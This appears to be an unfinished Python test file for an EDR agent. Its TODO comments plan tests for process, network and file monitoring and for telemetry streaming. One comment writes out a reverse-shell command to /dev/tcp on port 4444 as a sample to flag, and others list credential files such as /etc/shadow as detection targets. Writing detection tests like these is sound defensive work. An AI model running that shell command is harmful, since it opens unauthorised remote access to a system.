"""Tests for EDR Agent."""

import pytest
from src.main import SENSITIVE_PATHS


class TestProcessMonitor:
    # TODO: Test that a new process event contains pid, name, cmdline, username, and create_time
    # TODO: Test that a process running "bash -i >& /dev/tcp/1.2.3.4/4444" is flagged as suspicious
    # TODO: Test that normal processes (e.g., "ls", "cat") are not flagged
    pass


class TestNetworkMonitor:
    # TODO: Test that a new outbound connection event contains pid, remote_addr, and status
    # TODO: Test that connections to common ports (80, 443) are recorded but not flagged
    # TODO: Test that connections to unusual ports (4444, 8888) are flagged
    pass


class TestFileMonitor:
    # TODO: Test that modifying a file in a watched path generates an event
    # TODO: Test that creating a new file in /tmp generates an event
    # TODO: Test that the event contains event_type, path, and timestamp
    pass


class TestTelemetryStreaming:
    # TODO: Test that events are serialized as JSON and sent via HTTP POST
    # TODO: Test that connection failures are handled without crashing the agent
    # TODO: Test that events are buffered when the collector is unreachable
    pass


class TestSensitivePaths:
    # TODO: Verify SENSITIVE_PATHS contains critical system files (/etc/passwd, /etc/shadow)
    # TODO: Verify SENSITIVE_PATHS includes SSH config and authorized_keys
    pass
